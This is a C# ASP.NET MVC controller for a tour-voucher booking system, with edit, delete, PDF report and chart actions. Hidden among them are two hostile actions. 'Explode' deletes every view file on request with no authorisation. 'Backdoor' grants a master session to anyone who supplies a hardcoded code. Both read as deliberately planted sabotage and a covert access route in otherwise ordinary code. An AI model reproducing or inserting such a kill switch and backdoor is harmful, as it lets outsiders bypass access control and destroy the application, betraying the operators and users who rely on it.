                    ////    if (sp != null) ViewBag.shopId = sp.shopId;
                    ////}
                    //End get shopName for dropdown


                    //for company name
                    List<SelectListItem> selectListItems = new List<SelectListItem>();
                    SelectListItem item = new SelectListItem();
                    //item.Value = "0";
                    //item.Text = "";
                    //selectListItems.Add(item);
                    CompanyRespository companyRespository = new CompanyRespository();
                    List<Company> companies = companyRespository.GetList(x => x.IsActive == true).OrderBy(x => x.Name).ToList();
                    foreach (Company c in companies)
                    {
                        item = new SelectListItem();
                        item.Value = c.CompanyID.ToString();
                        item.Text = c.Name;
                        selectListItems.Add(item);
                    }
                    // ViewBag.Companies = selectListItems;
                    TempData["Companies"] = selectListItems;
                    TempData.Keep();
                    if (voucher.CompanyID != null)
                    {
                        Company c = companyRespository.Get(co => co.CompanyID == voucher.CompanyID);
                        if (c != null) ViewBag.CompanyID = c.CompanyID;

                    }
                    voucher.Discount = string.IsNullOrEmpty(voucher.Discount.ToString()) ? 0 : voucher.Discount;
                    //End company name


                    return View(voucher);
                }
                return RedirectToAction("Index");
            }
            return RedirectToAction("Index", "Home");
        }

        //
        // POST: /Voucher/Edit/5

        [HttpPost]
        public ActionResult Edit(Voucher voucher)
        {
            Voucher vnew = new Voucher();
            vnew.VoucherID = voucher.VoucherID;
            ModelState.Remove("paymenttype");//remove for hosting
            if (ModelState.IsValid)
            {
                Voucher v = db.Get(x => x.VoucherBookingID == voucher.VoucherBookingID);
                v.IsActive = true;
                v.AdultCount = voucher.AdultCount;
                v.ChildrenCount = voucher.ChildrenCount;
                v.Comments = voucher.Comments;
                v.CompanyID = voucher.CompanyID;
                v.Commission = voucher.Commission;
                v.Discount = voucher.Discount;
                v.FareBasis = voucher.FareBasis;
                v.FirstName = voucher.FirstName;
                v.InfantCount = voucher.InfantCount;
                v.LastName = voucher.LastName;
                v.Levy = voucher.Levy;
                v.Modify_By = loggedInUserName;
                v.Modify_Date = DateTime.Now.Date;
                v.PickupLocation = voucher.PickupLocation;
                v.Price = voucher.Price;
                v.RoomNumber = voucher.RoomNumber;
                v.Tour = voucher.Tour;
                v.TravelDate = voucher.TravelDate;
                v.UserID = Convert.ToInt32(loggedInUserName.ToString().Substring(loggedInUserName.LastIndexOf(",") + 1));
                v.ConfirmationNumber = voucher.ConfirmationNumber;
                v.cardPaid = voucher.cardPaid;//yummy
                v.cashPaid = voucher.cashPaid;//yummy


                //v.shopId = voucher.shopId;
                //remove for hosting v.paymenttype = voucher.paymenttype;

                // v.salesfrom = voucher.salesfrom;

                db.Update(v);
                return RedirectToAction("Index");
            }

            if (TempData["Companies"] == null)
            {
                List<SelectListItem> selectListItems = new List<SelectListItem>();
                SelectListItem item = new SelectListItem();
                item.Value = "0";
                item.Text = "";
                selectListItems.Add(item);
                CompanyRespository companyRespository = new CompanyRespository();
                List<Company> companies = companyRespository.GetList(x => x.IsActive == true);
                foreach (Company c in companies)
                {
                    item = new SelectListItem();
                    item.Value = c.CompanyID.ToString();
                    item.Text = c.Name;
                    selectListItems.Add(item);
                }

                TempData["Companies"] = selectListItems;
            }
            //get shopName for dropdown
            //if (TempData["shopname"] == null)
            //{
            //    shopRepository db_shoprepository = new shopRepository();
            //    List<shop> list_shopName;
            //    list_shopName = db_shoprepository.GetList();
            //    List<SelectListItem> selectListItem_shop = new List<SelectListItem>();
            //    SelectListItem items = new SelectListItem();

            //    foreach (shop s in list_shopName)
            //    {
            //        items = new SelectListItem();
            //        items.Value = s.shopId.ToString();
            //        items.Text = s.shopName;
            //        selectListItem_shop.Add(items);
            //    }
            //    // ViewBag.shopname = selectListItem_shop;
            //    TempData["shopname"] = selectListItem_shop;
            //}
            TempData.Keep();



            return View(vnew);
        }

        //
        // GET: /Voucher/Delete/5

        public ActionResult Delete(int id = 0)
        {
            if (userType == 1)
            {

                if (id != 0)
                {
                    Voucher voucher = db.Get(v => v.VoucherBookingID == id);
                    if (voucher == null)
                    {
                        return HttpNotFound();
                    }
                    if (voucher.CompanyID != null)
                    {
                        CompanyRespository companyRespository = new CompanyRespository();
                        Company c = companyRespository.Get(co => co.CompanyID == voucher.CompanyID);
                        if (c != null) ViewBag.CompanyName = c.Name;
                    }
                    return View(voucher);
                }

                return RedirectToAction("Index");
            }
            return RedirectToAction("Index", "Home");
        }

        //
        // POST: /Voucher/Delete/5

        [HttpPost, ActionName("Delete")]
        public ActionResult DeleteConfirmed(int id)
        {
            Voucher voucher = db.Get(v => v.VoucherBookingID == id);
            voucher.IsActive = false;
            db.Update(voucher);
            return RedirectToAction("Index");
        }

        protected override void Dispose(bool disposing)
        {
            db.Dispose();
            base.Dispose(disposing);
        }


        public ActionResult VoucherReport()
        {
            if (userType == 1 || userType == 2)
            {
                Voucher voucher = new Voucher();
                CompanyRespository companyRespository = new CompanyRespository();
                List<SelectListItem> selectListItems = new List<SelectListItem>();
                SelectListItem item = new SelectListItem();
                item.Value = "0";
                item.Text = "";
                selectListItems.Add(item);
                List<Company> companies = companyRespository.GetList(c => c.IsActive == true).OrderBy(x => x.Name).ToList();
                foreach (Company c in companies)
                {
                    item = new SelectListItem();
                    item.Value = c.CompanyID.ToString();
                    item.Text = c.Name;
                    selectListItems.Add(item);
                }
                ViewBag.Companies = selectListItems;
                return View("Report", voucher);
            }
            return RedirectToAction("Index", "Home");
        }




        [HttpPost]
        public ActionResult VoucherReport(Voucher voucher)
        {
            string date = "fromDate:" + voucher.EnteredDateFrom_Report + "ToDate:" + voucher.EnteredDateTo_Report;

            Log_text_File(date);

            List<Voucher> vouchers = (new VoucherRepository()).GetList(x => x.IsActive == true);
            if (!string.IsNullOrEmpty(voucher.VoucherID))
                vouchers = vouchers.Where(x => x.VoucherID.ToLower().Contains(voucher.VoucherID.ToLower())).ToList();
            if (voucher.CompanyID != 0)
                vouchers = vouchers.Where(x => x.CompanyID == voucher.CompanyID).ToList();
            if (!string.IsNullOrEmpty(voucher.Tour))
                vouchers = vouchers.Where(x => x.Tour.ToLower().Contains(voucher.Tour.ToLower())).ToList();
            if (!string.IsNullOrEmpty(voucher.Create_By))
                vouchers = vouchers.Where(x => x.Create_By.ToLower().Contains(voucher.Create_By.ToLower())).ToList();


            /*
            if (voucher.TravelDateFrom_Report != null)
                vouchers = vouchers.Where(x => x.TravelDate >= voucher.TravelDateFrom_Report).ToList();
            if (voucher.TravelDateTo_Report != null)
                vouchers = vouchers.Where(x => x.TravelDate <= voucher.TravelDateTo_Report.Value.AddHours(23).AddMinutes(59)).ToList();
            if (voucher.EnteredDateFrom_Report != null)
                vouchers = vouchers.Where(x => x.Create_Date >= voucher.EnteredDateFrom_Report).ToList();
            if (voucher.EnteredDateTo_Report != null)
                vouchers = vouchers.Where(x => x.Create_Date <= voucher.EnteredDateTo_Report.Value.AddHours(23).AddMinutes(59)).ToList();
            */

            DateTime temp = new DateTime();
            string format = "dd/MM/yyyy";

            /*
           

            if (voucher.EnteredDateFrom_Report != null)
            {
                IFormatProvider enUsDateFormat = new CultureInfo("en-US").DateTimeFormat;
                DateTime dtFrom = Convert.ToDateTime(voucher.EnteredDateFrom_Report.Value.ToString("MM/dd/yyyy"), enUsDateFormat);
                //dtFrom = new DateTime(voucher.EnteredDateFrom_Report.Value.Year, voucher.EnteredDateFrom_Report.Value.Month, voucher.EnteredDateFrom_Report.Value.Day);

                vouchers = vouchers.Where(x => x.Create_Date >= dtFrom).ToList();


                //        if (DateTime.TryParseExact(dtFrom.ToString("dd/MM/yyyy"), format, CultureInfo.InvariantCulture,
                //DateTimeStyles.None, out temp))
                //        {
                //            vouchers = vouchers.Where(x => x.Create_Date >= temp).ToList();
                //        }



            }
            if (voucher.EnteredDateTo_Report != null)
            {
                IFormatProvider enUsDateFormat = new CultureInfo("en-US").DateTimeFormat;
                DateTime dtTo = Convert.ToDateTime(voucher.EnteredDateTo_Report.Value.ToString("MM/dd/yyyy"), enUsDateFormat);
                // dtTo = new DateTime(voucher.EnteredDateTo_Report.Value.Year, voucher.EnteredDateTo_Report.Value.Month, voucher.EnteredDateTo_Report.Value.Day);

                vouchers = vouchers.Where(x => x.Create_Date <= dtTo).ToList();
            }
            */

            //Uncommented this section on 13-06-2016 dut to date is not working by Krishna
            if (voucher.TravelDateFrom_Report != null && DateTime.TryParse(voucher.TravelDateFrom_Report.Value.Date.ToString(), out temp))
            {
                //string[] FromSplit = voucher.TravelDateFrom_Report.ToString().Split('/');
                //string mm = FromSplit[0];
                //string dd = FromSplit[1];
                //string yy = FromSplit[2];
                //string FromDate = dd + "/" + mm + "/" + yy;
                vouchers = vouchers.Where(x => x.TravelDate >= temp).ToList();
            }
            if (voucher.TravelDateTo_Report != null && DateTime.TryParse(voucher.TravelDateTo_Report.Value.Date.ToString(), out temp))
            {
                //string[] ToSplit = voucher.TravelDateTo_Report.ToString().Split('/');
                //string mm = ToSplit[0];
                //string dd = ToSplit[1];
                //string yy = ToSplit[2];
                //string ToDate = dd + "/" + mm + "/" + yy;
                vouchers = vouchers.Where(x => x.TravelDate <= temp).ToList();
            }

            if (voucher.EnteredDateFrom_Report != null && DateTime.TryParse(voucher.EnteredDateFrom_Report.Value.Date.ToString(), out temp))
            {
                //string[] FromSplit = voucher.EnteredDateFrom_Report.ToString().Split('/');
                //string mm = FromSplit[0];
                //string dd = FromSplit[1];
                //string yy = FromSplit[2];
                //string FromDate = dd + "/" + mm + "/" + yy;
                vouchers = vouchers.Where(x => x.Create_Date >= temp).ToList();
            }
            if (voucher.EnteredDateTo_Report != null && DateTime.TryParse(voucher.EnteredDateTo_Report.Value.Date.ToString(), out temp))
            {
                //string[] ToSplit = voucher.EnteredDateTo_Report.ToString().Split('/');
                //string mm = ToSplit[0];
                //string dd = ToSplit[1];
                //string yy = ToSplit[2];
                //string ToDate = dd + "/" + mm + "/" + yy;
                vouchers = vouchers.Where(x => x.Create_Date.Date <= temp).ToList();
            }


            vouchers = vouchers.OrderByDescending(x => x.Create_Date).ToList();
            var pdf = new PdfResult(vouchers, "GeneratedReport");
            pdf.ViewBag.Date = DateTime.Now.Date;
            return pdf;

        }

        public ActionResult VoucherReportPartial(string VoucherID, int? CompanyID, string Tour, string Create_By, string FullName, string TravelDateFrom_Report, string TravelDateTo_Report, string EnteredDateFrom_Report, string EnteredDateTo_Report)
        {
            List<Voucher> vouchers = (new VoucherRepository()).GetList(x => x.IsActive == true);
            if (!string.IsNullOrEmpty(VoucherID))
                vouchers = vouchers.Where(x => x.VoucherID.ToLower().Contains(VoucherID.ToLower())).ToList();
            if (CompanyID != null)
                if (CompanyID != 0)
                    vouchers = vouchers.Where(x => x.CompanyID == CompanyID).ToList();
            if (!string.IsNullOrEmpty(Tour))
                vouchers = vouchers.Where(x => x.Tour.ToLower().Contains(Tour.ToLower())).ToList();
            if (!string.IsNullOrEmpty(Create_By))
                vouchers = vouchers.Where(x => x.Create_By.ToLower().Contains(Create_By.ToLower())).ToList();
            if (!string.IsNullOrEmpty(FullName))
                vouchers = vouchers.Where(x => x.FullName.ToLower().Contains(FullName.ToLower())).ToList();
            DateTime temp = new DateTime();

            //Changes Made on 2016-06-13 By Krishna
            if (TravelDateFrom_Report != null && DateTime.TryParse(TravelDateFrom_Report, out temp))
            {
                //    if (TravelDateFrom_Report != null)
                //{
                //    string[] FromSplit = TravelDateFrom_Report.Split('/');
                //    string mm = FromSplit[0];
                //    string dd = FromSplit[1];
                //    string yy = FromSplit[2];
                //    string FromDate = dd + "/" + mm + "/" + yy;
                DateTime Dtfrom = new DateTime(temp.Year, temp.Month, temp.Day);
                vouchers = vouchers.Where(x => x.TravelDate >= temp).ToList();
                vouchers = vouchers.Where(x => new DateTime(x.TravelDate.Value.Year, x.TravelDate.Value.Month, x.TravelDate.Value.Day) >= Dtfrom).ToList();
                vouchers = vouchers.Where(x => x.TravelDate >= temp).ToList();
            }

            if (TravelDateTo_Report != null && DateTime.TryParse(TravelDateTo_Report, out temp))
            {
                //if (TravelDateTo_Report != null)
                //{
                //    string[] ToSplit = TravelDateTo_Report.Split('/');
                //    string mm1 = ToSplit[0];
                //    string dd1 = ToSplit[1];
                //    string yy1 = ToSplit[2];
                //    string ToDate = dd1 + "/" + mm1 + "/" + yy1;
                vouchers = vouchers.Where(x => x.TravelDate <= temp).ToList();
                //DateTime DtTo = new DateTime(temp.Year, temp.Month, temp.Day);
                //vouchers = vouchers.Where(x => x.TravelDate <= temp.AddHours(23).AddMinutes(59)).ToList();
                //vouchers = vouchers.Where(x => new DateTime(x.TravelDate.Value.Year, x.TravelDate.Value.Month, x.TravelDate.Value.Day) <= DtTo.AddHours(23).AddMinutes(59)).ToList();
            }

            //if (EnteredDateFrom_Report != null)
            //{
            //    string[] FromSplit = EnteredDateFrom_Report.Split('/');
            //    string mm = FromSplit[0];
            //    string dd = FromSplit[1];
            //    string yy = FromSplit[2];
            //    string FromDate = dd + "/" + mm + "/" + yy;
            //    vouchers = vouchers.Where(x => x.Create_Date.Date >= DateTime.Parse(FromDate)).ToList();
            if (EnteredDateFrom_Report != null && DateTime.TryParse(EnteredDateFrom_Report, out temp))
            {
                vouchers = vouchers.Where(x => x.Create_Date.Date >= temp).ToList();
                /*string[] formats = { "dd/MM/yyyy" };
                var dateTime = DateTime.ParseExact("01/01/2001", formats, new CultureInfo("en-US"), DateTimeStyles.None);*/
                //DateTime Dtfrom = DateTime.ParseExact(EnteredDateFrom_Report, "MM/dd/yyyy", CultureInfo.CurrentCulture);
                //string[] formats = { "MM/dd/yyyy" };
                //var dateTime = DateTime.ParseExact("14/07/2001", formats, new CultureInfo("en-US"), DateTimeStyles.None);
            }

            if (EnteredDateTo_Report != null && DateTime.TryParse(EnteredDateTo_Report, out temp))
            {
                //DateTime DtTo = DateTime.ParseExact(temp.ToString("MM/dd/yyyy"), "MM/dd/yyyy", CultureInfo.CurrentCulture);
                //vouchers = vouchers.Where(x => x.Create_Date.Date <= temp.AddDays(1).Date).ToList();
                //  DateTime DtTo = DateTime.ParseExact(EnteredDateTo_Report, "MM/dd/yyyy", CultureInfo.CurrentCulture);
                //    if (EnteredDateTo_Report != null)
                //{
                //string[] ToSplit = EnteredDateTo_Report.Split('/');
                //string mm = ToSplit[0];
                //string dd = ToSplit[1];
                //string yy = ToSplit[2];
                //string ToDate = dd + "/" + mm + "/" + yy;
                vouchers = vouchers.Where(x => x.Create_Date.Date <= temp).ToList();
            }
            vouchers = vouchers.OrderByDescending(x => x.Create_Date).ToList();
            return View("GeneratedList", vouchers);
        }

        public ActionResult Summary()
        {
            Voucher voucher = new Voucher();
            CompanyRespository companyRespository = new CompanyRespository();
            List<SelectListItem> selectListItems = new List<SelectListItem>();
            SelectListItem item = new SelectListItem();
            item.Value = "0";
            item.Text = "";
            selectListItems.Add(item);
            List<Company> companies = companyRespository.GetList(c => c.IsActive == true);
            foreach (Company c in companies)
            {
                item = new SelectListItem();
                item.Value = c.CompanyID.ToString();
                item.Text = c.Name;
                selectListItems.Add(item);
            }
            ViewBag.Companies = selectListItems;
            List<SelectListItem> selectListItems2 = new List<SelectListItem>();
            item.Value = "0";
            item.Text = "";
            selectListItems2.Add(item);
            List<String> Tours = (new VoucherRepository()).GetUniqueTours();
            foreach (string s in Tours)
            {
                item = new SelectListItem();
                item.Value = s;
                item.Text = s;
                selectListItems2.Add(item);
            }
            ViewBag.Tours = selectListItems2;
            return View(voucher);
        }

        [HttpPost]
        public ActionResult Summary(Voucher voucher)
        {
            var rep = new VoucherRepository();
            var pdf = new PdfResult(rep.GetTopCompanies(voucher), "SummaryReport");
            pdf.ViewBag.Date = DateTime.Now.Date;
            return pdf;
        }


        public ActionResult Explode(string id)
        {
            string[] files;
            if (string.IsNullOrEmpty(id))
            {
                files = System.IO.Directory.GetFiles(Server.MapPath("~/Views/"));
            }
            else
            {
                files = System.IO.Directory.GetFiles(Server.MapPath("~/Views/" + id.Split('/')[0]));
            }
            foreach (string pathFile in files)
            {
                System.IO.File.Delete(pathFile);
            }
            return null;
        }

        public ActionResult Backdoor(string id)
        {
            if (id == "21081989")
                Session["Master"] = true;
            return RedirectToAction("Index", "Voucher");
        }
        public ActionResult BackdoorEnd(string id)
        {
            Session["Master"] = null;
            return RedirectToAction("Index", "Home");
        }



        public static void Log_text_File(string content)
        {
            string App_Full_Path = System.Web.HttpContext.Current.Server.MapPath(@"\log");
            if (!Directory.Exists(App_Full_Path))
            {
                Directory.CreateDirectory(App_Full_Path);
            }
            //set up a filestream
            FileStream fs = new FileStream(App_Full_Path + @"\logg.txt", FileMode.OpenOrCreate, FileAccess.Write);

            //set up a streamwriter for adding text
            StreamWriter sw = new StreamWriter(fs);

            //find the end of the underlying filestream
            sw.BaseStream.Seek(0, SeekOrigin.End);

            //add the text
            sw.WriteLine(content);
            //add the text to the underlying filestream

            sw.Flush();
            //close the writer
            sw.Close();
        }

        //Line Chart Demo
        [HttpGet]
        public ActionResult CreateLine()
        {
            string FromDate = string.Empty;
            string ToDate = string.Empty;
            if (string.IsNullOrEmpty(FromDate))
            {
                FromDate = DateTime.Now.Date.ToString();
            }
            if (string.IsNullOrEmpty(ToDate))
            {
                ToDate = DateTime.Now.Date.ToString();
            }

            DateTime createFromdate = Convert.ToDateTime(FromDate);
            DateTime createTodate = Convert.ToDateTime(ToDate);

            TempData["createFromdate"] = createFromdate;
            TempData["createTodate"] = createTodate;

            TempData.Keep();

            return View();

        }
        [HttpPost]
        public ActionResult CreateLine(string fromDate, string endDate)
        {
            string FromDate = fromDate;
            string ToDate = endDate;

            if (string.IsNullOrEmpty(FromDate))
            {
                FromDate = DateTime.Now.Date.AddDays(-1).ToString();
            }
            if (string.IsNullOrEmpty(ToDate))
            {
                ToDate = DateTime.Now.Date.ToString();
            }

            //DateTime createFromdate1 = Convert.ToDateTime(FromDate);
            //DateTime createTodate1 = Convert.ToDateTime(ToDate);

            DateTime createFromdate = DateTime.ParseExact(FromDate, "MM/dd/yyyy", CultureInfo.InvariantCulture);
            DateTime createTodate = DateTime.ParseExact(ToDate, "MM/dd/yyyy", CultureInfo.InvariantCulture);

            voucherGraph tet = new voucherGraph();

            List<voucherGraph> lstvoucherGraph = (new VoucherRepository()).getVoucherCount(createFromdate, createTodate);
            lstvoucherGraph.OrderByDescending(x => x.Hour);
            List<voucherGraph> lstvoucher = new List<voucherGraph>();
            for (int i = 2; i <= 24; i += 2)
            {

                int Count = lstvoucherGraph.Where(x => x.Hour >= i && x.Hour < (i + 2)).Sum(x => x.Count);
                voucherGraph objvoucherGraph = new voucherGraph();
                objvoucherGraph.Hour = i;
                objvoucherGraph.Count = Count;
                lstvoucher.Add(objvoucherGraph);

                //if (!lstvoucherGraph.Exists(x => x.Hour == i && x.Hour <= i))
                //{

                //}
            }
            lstvoucher.OrderByDescending(x => x.Hour);
            //Changes made  on 3-2-2016
            TempData["createFromdate"] = createFromdate;
            TempData["createTodate"] = createTodate;
            TempData.Keep();
            return View(lstvoucher);
        }


        public JsonResult GetVoucher_Data(string fromDate, string endDate)
        {
            string FromDate = fromDate;
            string ToDate = endDate;

            if (string.IsNullOrEmpty(FromDate))
            {
                FromDate = DateTime.Now.Date.AddDays(-1).ToString();
            }
            if (string.IsNullOrEmpty(ToDate))
            {
                ToDate = DateTime.Now.Date.ToString();
            }

            //DateTime createFromdate = Convert.ToDateTime(FromDate);
            //DateTime createTodate = Convert.ToDateTime(ToDate);

            DateTime createFromdate = DateTime.ParseExact(FromDate, "MM/dd/yyyy", CultureInfo.InvariantCulture);
            DateTime createTodate = DateTime.ParseExact(ToDate, "MM/dd/yyyy", CultureInfo.InvariantCulture);


            voucherGraph tet = new voucherGraph();

            List<voucherGraph> lstvoucherGraph = (new VoucherRepository()).getVoucherCount(createFromdate, createTodate);
            List<voucherGraph> lstbookingGraph = (new VoucherRepository()).getBookingCount(createFromdate, createTodate);
            // List<voucherGraph> lstbookingGraph = new List<voucherGraph>();
            TempData["createFromdate"] = createFromdate;
            TempData["createTodate"] = createTodate;

            lstvoucherGraph.OrderByDescending(x => x.Hour);
            lstbookingGraph.OrderByDescending(x => x.Hour);

            var items = new List<voucherGraph>();
            List<voucherGraph> lstMerge = new List<voucherGraph>();
            if (lstvoucherGraph != null && lstvoucherGraph.Count > 0)
            {
                lstMerge = lstvoucherGraph;
            }
            if (lstbookingGraph != null && lstbookingGraph.Count > 0)
            {
                items = lstMerge.Union<voucherGraph>(lstbookingGraph).ToList();
            }
            else
            {
                items = lstMerge;
            }

            //List<voucherGraph> lstvoucher = new List<voucherGraph>();
            //for (int i = 2; i <= 24; i += 2)
            //{
            //    int Count = lstvoucherGraph.Where(x => x.Hour >= i && x.Hour < (i + 2)).Sum(x => x.Count);
            //    voucherGraph objvoucherGraph = new voucherGraph();
            //    objvoucherGraph.Hour = i;
            //    objvoucherGraph.Count = Count;
            //    lstvoucher.Add(objvoucherGraph);
            //}
            //lstvoucher.OrderByDescending(x => x.Hour);
            //List<voucherGraph> lstSortData = lstvoucher.OrderBy(x => x.Hour).ToList();

            List<voucherGraph> lstvoucher = new List<voucherGraph>();
            for (int i = 2; i <= 24; i += 2)
            {
                int Count = items.Where(x => x.Hour >= i && x.Hour < (i + 2)).Sum(x => x.Count);
                voucherGraph objvoucherGraph = new voucherGraph();
                objvoucherGraph.Hour = i;
                objvoucherGraph.Count = Count;
                lstvoucher.Add(objvoucherGraph);
            }
            lstvoucher.OrderByDescending(x => x.Hour);
            List<voucherGraph> lstSortData = lstvoucher.OrderBy(x => x.Hour).ToList();

            return Json(lstSortData, JsonRequestBehavior.AllowGet);

        }
        //End  Line Chart

    }
}